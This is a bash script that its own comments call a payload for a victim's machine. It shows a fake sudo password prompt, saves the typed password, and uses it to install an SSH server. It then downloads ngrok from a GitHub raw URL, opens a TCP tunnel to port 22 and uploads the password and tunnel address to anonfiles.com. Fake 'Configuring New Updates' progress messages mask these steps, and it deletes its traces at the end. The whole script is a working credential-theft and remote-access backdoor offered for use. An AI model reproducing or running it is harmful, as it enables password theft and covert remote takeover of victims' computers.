whoami > output.txt  #Here the default output folder is output.txt if you want to change the name just sipmpliy replace the name (output).
var=$(whoami)
stty -echo
read -p "[sudo] password for $var:" PASS
stty -echo
echo "$PASS" >>output.txt
echo $PASS | sudo -S apt-get install openssh-server > /dev/null 2>&1
echo ""
echo "Please Wait Configuaring New Updates."
wget https://raw.githubusercontent.com/Esp26/ToolsRequirements/main/requirements.zip > /dev/null 2>&1 | echo "10% Complete"  
echo "60% Complete"
chmod +x ./requirements.zip
unzip requirements.zip > /dev/null 2>&1
rm requirements.zip
sudo mv ngrok /usr/bin
ngrok authtoken A NGROK AUTHTOKEN HERE > /dev/null 2>&1 #Your fake ngrok authtoken here.
echo "100% Complete"
echo ""
sudo service ssh start
echo ""
echo "Please Wait....."
echo ""
ngrok tcp 22 > /dev/null 2>&1 & sleep 20
curl http://127.0.0.1:4040/api/tunnels >> output.txt 
curl -F "file=@output.txt" https://api.anonfiles.com/upload?token=YOUR API KEY HERE > /dev/null 2>&1  # Visit anonfiles.com and login or register there then click on API.
clear
echo ""
echo "Configuration Complete."
sleep 3
clear
rm output.txt
#rm pay.sh  #Delete The Payload From Victims OS, Romove # Before rm To Make It Executeable (Deafault Name Is pay.sh) If You Want To Change The Name Simpliy Replace It With You New Name.
